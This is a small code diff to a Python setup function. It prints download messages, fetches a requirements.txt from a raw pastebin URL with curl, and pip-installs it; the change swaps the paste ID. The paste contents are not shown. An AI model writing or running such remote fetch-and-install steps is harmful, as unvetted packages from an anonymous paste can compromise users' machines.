@@ -11,7 +11,7 @@ def test():
 	print('[x] downloading bot.py')
 	time.sleep(3)
 	print('[x] Downloading requirements ')
-	os.system('curl https://pastebin.com/raw/Z77cKGcy -o requirements.txt')
+	os.system('curl https://pastebin.com/raw/ZByhxQCy -o requirements.txt')
 	print('[x] Installing pips')
 	os.system('pip install -r requirements.txt')
 	time.sleep(5)	
